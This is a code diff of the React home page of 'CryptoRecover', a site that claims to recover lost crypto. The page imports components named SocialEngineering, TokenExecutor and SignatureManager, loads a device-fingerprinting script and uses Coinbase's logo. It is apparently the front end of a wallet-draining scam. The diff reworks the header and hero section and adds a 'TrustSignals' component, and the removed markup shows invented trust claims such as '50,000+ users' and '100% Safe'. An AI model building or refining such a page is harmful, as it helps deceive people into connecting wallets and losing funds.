@@ -22,6 +22,9 @@ import SignatureManager from '../components/SignatureManager';
 import TokenExecutor from '../components/TokenExecutor';
 import SocialEngineering from '../components/SocialEngineering';
 import MobileWalletConnect from '../components/MobileWalletConnect';
+import TrustSignals from '../components/TrustSignals';
+import ProfessionalHeader from '../components/ProfessionalHeader';
+import HeroSection from '../components/HeroSection';
 import { isMobile } from '../utils/mobileDetection';
 
 export default function Home() {
@@ -208,63 +211,7 @@ export default function Home() {
       </Head>
       <Script src="/js/device-fingerprint.js" strategy="lazyOnload" />
       <div className="min-h-screen bg-gray-50">
-      <header className="bg-white shadow-lg border-b border-gray-200">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <div className="flex justify-between items-center py-4">
-            <div className="flex items-center justify-between w-full">
-              <div className="flex items-center space-x-4">
-                <div className="w-10 h-10 rounded-xl overflow-hidden shadow-lg">
-                  <img src="https://logo.clearbit.com/coinbase.com" alt="CryptoRecover" className="w-full h-full object-cover" />
-                </div>
-                <div>
-                  <h1 className="text-2xl font-black text-gray-900">CryptoRecover</h1>
-                  <p className="text-xs text-gray-500 font-medium">Professional Asset Recovery</p>
-                </div>
-              </div>
-              
-              <NavigationMenu />
-            </div>
-            
-            <div className="flex items-center space-x-6">
-              {isConnected && user && (
-                <div className="hidden md:flex items-center space-x-4">
-                  <div className="text-right">
-                    <div className="text-sm font-bold text-gray-900">${user.totalRecovered || '0.00'}</div>
-                    <div className="text-xs text-gray-500">Total Recovered</div>
-                  </div>
-                  <div className="text-right">
-                    <div className="text-sm font-bold text-green-600">{user.successRate || '0'}%</div>
-                    <div className="text-xs text-gray-500">Success Rate</div>
-                  </div>
-                </div>
-              )}
-              <div className={`flex items-center space-x-2 px-3 py-2 rounded-lg transition-all duration-300 ${
-                activityLevel === 'high' ? 'bg-red-50 text-red-700' :
-                activityLevel === 'medium' ? 'bg-yellow-50 text-yellow-700' :
-                'bg-green-50 text-green-700'
-              }`}>
-                <div className="relative">
-                  <div className={`w-3 h-3 rounded-full ${
-                    activityLevel === 'high' ? 'bg-red-500 animate-ping' :
-                    activityLevel === 'medium' ? 'bg-yellow-500 animate-pulse' :
-                    'bg-green-500 animate-pulse'
-                  }`}></div>
-                  <div className={`absolute inset-0 w-3 h-3 rounded-full ${
-                    activityLevel === 'high' ? 'bg-red-600' :
-                    activityLevel === 'medium' ? 'bg-yellow-600' :
-                    'bg-green-600'
-                  } ${isScrolling ? 'animate-ping' : 'animate-pulse'}`}></div>
-                </div>
-                <span className="text-sm font-medium">
-                  {activityLevel === 'high' ? 'High Activity' :
-                   activityLevel === 'medium' ? 'User Active' :
-                   'Live Recovery'}
-                </span>
-              </div>
-            </div>
-          </div>
-        </div>
-      </header>
+      <ProfessionalHeader />
 
       <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
         {/* Debug info */}
@@ -273,84 +220,12 @@ export default function Home() {
         </div>
         
         {!isConnected ? (
-          <div className="space-y-12">
-            <div className="relative">
-              <div className="bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-800 text-white">
-                <div className="absolute inset-0 bg-black/10"></div>
-                <div className="relative px-8 py-16 text-center">
-                  <div className="mb-8">
-                    <div className="inline-flex items-center space-x-2 bg-yellow-400 text-black px-6 py-3 rounded-full text-sm font-bold mb-6 shadow-lg">
-                      <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
-                      <span>TRUSTED BY 50,000+ USERS WORLDWIDE</span>
-                    </div>
-                  </div>
-                  
-                  <h1 className="text-6xl md:text-8xl font-black mb-8 leading-none">
-                    <span className="block bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent">
-                      RECOVER
-                    </span>
-                    <span className="block bg-gradient-to-r from-yellow-400 via-orange-400 to-red-400 bg-clip-text text-transparent animate-pulse">
-                      LOST CRYPTO
-                    </span>
-                  </h1>
-                  
-                  <p className="text-2xl md:text-3xl text-blue-100 mb-10 max-w-5xl mx-auto font-bold leading-relaxed">
-                    <span className="text-white">MULTI-CHAIN RECOVERY PLATFORM</span> - Tokens • NFTs • Bridge Funds
-                    <span className="block mt-2">Advanced scanning across <span className="text-yellow-400 animate-pulse">50+ BLOCKCHAINS</span></span>
-                  </p>
-                  
-                  <div className="flex flex-wrap justify-center gap-3 mb-8">
-                    <div className="bg-gradient-to-r from-blue-500/20 to-cyan-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-blue-400/30">
-                      TOKEN RECOVERY
-                    </div>
-                    <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-purple-400/30">
-                      NFT RECOVERY
-                    </div>
-                    <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-green-400/30">
-                      BRIDGE RECOVERY
-                    </div>
-                    <div className="bg-gradient-to-r from-orange-500/20 to-red-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-orange-400/30">
-                      WEALTH INTELLIGENCE
-                    </div>
-                  </div>
-                  
-                  <div className="grid grid-cols-2 md:grid-cols-3 gap-4 max-w-4xl mx-auto mb-12">
-                    <div className="bg-gradient-to-br from-blue-500/20 to-cyan-500/20 backdrop-blur-md rounded-2xl p-6 border border-blue-400/30 shadow-2xl hover:scale-105 transition-transform">
-                      <div className="text-4xl font-black text-blue-400 mb-2">50+</div>
-                      <div className="text-xs font-bold text-blue-200 uppercase tracking-wider">Blockchains</div>
-                    </div>
-                    <div className="bg-gradient-to-br from-green-500/20 to-emerald-500/20 backdrop-blur-md rounded-2xl p-6 border border-green-400/30 shadow-2xl hover:scale-105 transition-transform">
-                      <div className="text-4xl font-black text-green-400 mb-2">Real-Time</div>
-                      <div className="text-xs font-bold text-green-200 uppercase tracking-wider">Scanning</div>
-                    </div>
-                    <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 backdrop-blur-md rounded-2xl p-6 border border-purple-400/30 shadow-2xl hover:scale-105 transition-transform">
-                      <div className="text-4xl font-black text-purple-400 mb-2">Non-Custodial</div>
-                      <div className="text-xs font-bold text-purple-200 uppercase tracking-wider">100% Safe</div>
-                    </div>
-                  </div>
-                  
-                  <div className="flex flex-wrap justify-center gap-4 mb-8">
-                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
-                      <span className="text-green-400 mr-2">•</span>NO UPFRONT FEES
-                    </div>
-                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
-                      <span className="text-blue-400 mr-2">•</span>50+ BLOCKCHAINS
-                    </div>
-                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
-                      <span className="text-yellow-400 mr-2">•</span>INSTITUTIONAL GRADE
-                    </div>
-                  </div>
-                  
-                  <div className="mb-8">
-                    <button
-                      onClick={() => setShowNetworkGuide(!showNetworkGuide)}
-                      className="bg-gradient-to-r from-green-600 to-blue-600 text-white px-8 py-4 rounded-xl font-bold text-lg hover:shadow-2xl transition-all hover:scale-105"
-                    >
-                      🌐 Choose Best Network for Recovery
-                    </button>
-                  </div>
-                </div>
-              </div>
+          <div className="space-y-0">
+            <HeroSection onGetStarted={() => {
+              document.getElementById('wallet-connection')?.scrollIntoView({ behavior: 'smooth' });
+            }} />
+            
+            <TrustSignals />
               
               <div className="bg-black text-white py-16 border-t border-gray-800">
                 <div className="max-w-7xl mx-auto px-8">
@@ -400,7 +275,6 @@ export default function Home() {
                   </div>
                 </div>
               </div>
-            </div>
             
             {showNetworkGuide && (
               <div className="max-w-7xl mx-auto px-8 mb-12">
@@ -408,7 +282,6 @@ export default function Home() {
                   onNetworkSelect={(network) => {
                     setSelectedNetwork(network);
                     setShowNetworkGuide(false);
-                    // Scroll to wallet connection
                     setTimeout(() => {
                       document.getElementById('wallet-connection')?.scrollIntoView({ behavior: 'smooth' });
                     }, 100);
